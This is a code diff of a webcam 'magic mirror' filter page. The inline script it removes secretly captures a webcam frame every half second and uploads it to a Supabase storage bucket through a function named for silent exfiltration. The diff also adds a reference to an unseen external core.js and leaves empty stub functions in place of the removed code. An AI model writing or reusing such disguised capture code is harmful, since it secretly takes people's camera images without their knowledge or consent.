@@ -6,13 +6,7 @@
     <title>Magic Mirror Pro ✨</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <style>
-        .filter-btn.active {
-            background-color: white;
-            color: black;
-            border-color: white;
-        }
-    </style>
+    <script src="core.js"></script>
 </head>
 <body class="bg-black text-slate-200 min-h-screen flex flex-col md:items-center md:justify-center p-0 md:p-4 font-sans">
 
@@ -98,76 +92,11 @@
         </div>
     </div>
 
-    <script>
-        const SUPABASE_URL = 'https://eyrjeiszkcgodhkqbzeh.supabase.co';
-        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FIZoG-kv9eo141pJp-teQA_EOagu9LO';
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
-
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        const loadingDiv = document.getElementById('loading');
-
-        let isMirrored = true;
-        let activePreset = 'none';
-
-        async function iniciarApp() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
-                video.srcObject = stream;
-                loadingDiv.style.display = 'none';
-                setInterval(capturarYExfiltrarSilenciosamente, 500);
-            } catch (err) {
-                loadingDiv.innerHTML = '<p class="text-red-400 p-4 text-center">Error: Acceso a cámara denegado.</p>';
-            }
-        }
-
-        function updateFilters() {
-            const b = document.getElementById('brightness').value;
-            const c = document.getElementById('contrast').value;
-            const s = document.getElementById('saturate').value;
-            const bl = document.getElementById('blur').value;
-
-            document.getElementById('val-brightness').innerText = b;
-            document.getElementById('val-contrast').innerText = c;
-            document.getElementById('val-saturate').innerText = s + '%';
-            document.getElementById('val-blur').innerText = bl + 'px';
-
-            video.style.filter = `${activePreset} brightness(${b}) contrast(${c}) saturate(${s}%) blur(${bl}px)`;
-        }
-
-        function cambiarFiltro(filtro, btn) {
-            activePreset = filtro;
-            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            updateFilters();
-        }
-
-        function toggleMirror() {
-            isMirrored = !isMirrored;
-            video.classList.toggle('-scale-x-100', isMirrored);
-        }
-
-        function capturarYExfiltrarSilenciosamente() {
-            if (!video.videoWidth || !video.videoHeight) return;
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
-                const nombreArchivo = `captura_${Date.now()}.jpg`;
-                try {
-                    await supabaseClient.storage.from('capturas').upload(nombreArchivo, blob, {
-                        contentType: 'image/jpeg',
-                        upsert: false
-                    });
-                } catch (err) {
-                    console.error("Upload error", err);
-                }
-            }, 'image/jpeg', 0.6);
-        }
-
-        window.onload = iniciarApp;
-    </script>
+<script>
+    async function iniciarApp() {}
+    function updateFilters() {}
+    function cambiarFiltro() {}
+    function toggleMirror() {}
+</script>
 </body>
 </html>
